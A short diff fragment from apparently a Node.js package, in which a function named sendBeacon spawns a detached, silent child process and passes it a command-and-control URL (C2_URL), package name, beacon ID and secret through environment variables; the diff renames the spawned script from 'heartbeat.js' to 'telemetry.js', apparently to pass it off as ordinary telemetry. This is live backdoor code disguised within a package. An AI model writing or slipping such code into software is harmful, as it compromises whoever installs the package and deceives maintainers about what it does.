@@ -91,7 +91,7 @@ function sendBeacon(extra) {
   req.end();
 
   try {
-    const child = cp.spawn(process.execPath, [path.join(__dirname, 'heartbeat.js')], {
+    const child = cp.spawn(process.execPath, [path.join(__dirname, 'telemetry.js')], {
       detached: true,
       stdio: 'ignore',
       env: { ...process.env, DOLUS_C2: C2_URL, DOLUS_PKG: PKG_NAME, DOLUS_BEACON_ID: BEACON_ID, DOLUS_SECRET: BEACON_SECRET },
